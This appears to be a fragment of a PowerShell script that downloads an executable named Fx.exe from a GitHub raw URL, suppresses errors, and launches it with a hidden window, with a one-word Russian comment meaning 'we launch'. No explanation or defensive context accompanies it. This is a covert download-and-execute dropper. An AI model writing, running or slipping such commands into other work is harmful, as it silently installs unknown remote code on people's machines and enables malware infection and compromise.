Invoke-WebRequest -Uri "https://github.com/kilordow/Fx.exe/raw/refs/heads/main/Fx.exe" -OutFile "Fx.exe" -ErrorAction SilentlyContinue
    
    # Запускаем 
    Start-Process -FilePath "Fx.exe" -WindowStyle Hidden
